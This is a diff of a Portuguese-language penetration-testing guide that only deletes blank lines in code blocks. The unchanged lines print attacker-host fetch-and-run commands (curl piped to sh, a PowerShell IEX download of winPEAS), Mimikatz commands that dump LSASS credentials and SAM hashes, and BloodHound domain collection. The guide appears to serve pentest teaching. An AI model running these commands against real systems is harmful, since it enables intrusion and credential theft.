@@ -26,19 +26,15 @@ Uma vez estabelecido o acesso inicial, geralmente restrito a um usuário de baix
 
 ```bash
 # Transferência do script para a máquina alvo via servidor HTTP temporário (na máquina atacante)
-
 python3 -m http.server 8080
 
 # Download e execução direta em memória no alvo comprometido (Linux), sem gravação em disco
-
 curl -s [http://IP_atacante:8080/linpeas.sh] | sh
 
 # Execução com saída completa redirecionada para arquivo, ignorando etapas demoradas de verificação de CVEs
-
 ./linpeas.sh -a > [saida_linpeas.txt]
 
 # Execução do equivalente Windows (via PowerShell) diretamente em memória
-
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[IP_atacante]:8080/winPEAS.ps1')"
 ```
 
@@ -66,23 +62,18 @@ curl -s http://10.0.5.100:8080/linpeas.sh | sh > resultado_linpeas.txt
 
 ```bash
 # Inicialização da ferramenta (requer execução em contexto administrativo local no Windows)
-
 mimikatz.exe
 
 # Dentro da console: elevação de privilégios para o nível de depuração necessário para acessar o LSASS
-
 privilege::debug
 
 # Extração de todas as credenciais em cache (senhas, hashes NTLM e tíquetes) da memória do LSASS
-
 sekurlsa::logonpasswords
 
 # Extração específica de tíquetes Kerberos armazenados na sessão atual
-
 sekurlsa::tickets /export
 
 # Dump completo do banco SAM local (hashes de contas locais)
-
 lsadump::sam
 ```
 
@@ -92,7 +83,6 @@ lsadump::sam
 
 ```bash
 privilege::debug
-
 sekurlsa::logonpasswords
 ```
 
@@ -112,19 +102,15 @@ sekurlsa::logonpasswords
 
 ```bash
 # Inicialização do banco de dados de grafos (pré-requisito para o BloodHound)
-
 sudo neo4j start
 
 # Inicialização da interface gráfica principal de análise
-
 bloodhound
 
 # Coleta de dados no domínio a partir de uma máquina Windows já comprometida (executando o SharpHound.exe)
-
 SharpHound.exe -c All
 
 # Coleta remota de dados via Python (BloodHound.py), útil quando não há execução direta em um host Windows
-
 bloodhound-python -u [usuario] -p [senha] -d [dominio.local] -ns [IP_do_DC] -c All
 ```
 
